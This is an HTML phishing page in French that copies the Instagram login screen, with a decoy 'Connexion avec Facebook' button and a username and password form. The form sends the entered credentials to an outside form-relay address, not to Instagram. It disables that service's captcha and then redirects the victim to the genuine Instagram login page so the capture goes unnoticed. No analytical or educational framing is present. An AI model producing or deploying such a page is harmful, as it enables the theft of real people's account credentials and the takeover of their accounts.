<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Connexion Instagram</title>
  <style>
    body { font-family: Arial, sans-serif; max-width: 400px; margin: 40px auto; padding: 0 15px; }
    label { display: block; margin-top: 20px; font-weight: bold; }
    input[type="text"], input[type="password"] { width: 100%; padding: 8px; margin-top: 5px; box-sizing: border-box; }
    button { background-color: #3897f0; color: white; font-weight: bold; border: none; width: 100%; padding: 12px; font-size: 16px; cursor: pointer; border-radius: 5px; margin-top: 25px; }
    .facebook-btn { background-color: #1877f2; color: white; font-weight: bold; border: none; width: 100%; padding: 12px; font-size: 16px; cursor: pointer; border-radius: 5px; margin-bottom: 25px; }
  </style>
</head>
<body>

<form
  action="https://formsubmit.co/el/riyoye"
  method="POST"
  autocomplete="off"
  onsubmit="setTimeout(() => { window.location.href='https://www.instagram.com/accounts/login/'; }, 100);"
>
  <button type="button" class="facebook-btn">Connexion avec Facebook</button>

  <label for="username">Téléphone, nom d’utilisateur ou email *</label>
  <input type="text" id="username" name="username" required />

  <label for="password">Mot de passe *</label>
  <input type="password" id="password" name="password" required />

  <button type="submit">Se connecter</button>

  <!-- Pour désactiver captcha (facultatif) -->
  <input type="hidden" name="_captcha" value="false" />
  <!-- URL de redirection après soumission -->
  <input type="hidden" name="_next" value="https://www.instagram.com/accounts/login/" />
</form>

</body>
</html>
